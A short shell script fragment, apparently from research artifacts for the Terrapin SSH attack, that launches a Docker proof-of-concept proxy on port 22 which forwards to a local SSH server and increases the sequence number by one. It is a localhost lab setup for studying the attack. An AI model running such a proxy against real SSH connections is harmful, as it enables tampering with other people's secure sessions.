...
echo "[+] Starting RcvIncrease proxy on port 22. Connection will be proxied to 127.0.0.1:2222"
# Start RcvIncrease PoC proxy (sequence number will be increased by N = 1)
docker run \
  --rm \
  --network host \
  --name terrapin-artifacts-poc \
  terrapin-artifacts/sqn-rcv-increase --server-ip 127.0.0.1 --server-port 2222 -N 1 &
